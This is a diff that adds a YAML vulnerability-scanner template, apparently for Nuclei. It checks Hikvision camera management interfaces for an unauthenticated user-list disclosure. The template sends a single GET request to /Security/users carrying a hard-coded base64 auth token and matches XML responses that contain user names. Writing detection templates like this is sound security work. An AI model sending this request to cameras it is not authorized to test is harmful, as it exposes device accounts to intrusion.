@@ -1,0 +1,27 @@
+id: hikvision-camera-management-unauthorized-access-user-list
+
+info:
+  name: 海康威视摄像头管理后台未授权查看用户列表
+  author: Master先生
+  severity: medium
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-96469
+  tags: hikvision,camera,user
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Security/users?auth=YWRtaW46MTEK"
+
+    redirects: false
+
+    matchers-condition: and
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200"
+          - "contains((body), 'xml version')"
+          - "contains((body), 'userName')"
+          - "contains(tolower(all_headers), 'application/xml')"
+        condition: and
